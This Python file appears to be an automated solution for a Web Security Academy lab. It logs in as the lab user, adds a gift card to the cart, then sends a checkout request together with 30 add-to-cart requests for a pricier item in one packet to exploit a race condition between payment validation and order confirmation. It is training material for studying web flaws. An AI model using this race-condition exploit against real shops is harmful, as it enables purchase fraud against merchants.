from web_security_academy.core.logger import logger

from urllib.parse import urljoin
from requests import Request


def solve_lab(session):
    session.login("wiener", "peter")

    data = {"productId": "2", "quantity": "1", "price": "1", "redir": "PRODUCT"}
    session.post_path("/cart", data=data)
    logger.info('Added a "Gift Card" to cart')

    csrf = session.get_csrf_token("/cart", n=2)
    req = Request("POST", urljoin(session.url, "/cart/checkout"), data={"csrf": csrf})
    prepped = [session.prepare_request(req)]

    data = {"productId": "1", "quantity": "1", "price": "1", "redir": "PRODUCT"}
    req = Request("POST", urljoin(session.url, "/cart"), data=data)
    for _ in range(30):
        prepped.append(session.prepare_request(req))

    logger.info('Attempting to add a "Lightweight l33t leather jacket" to cart:')
    logger.info(" - After the payment is validated")
    logger.info(" - Before the order is confirmed")
    session.single_packet_send(*prepped)
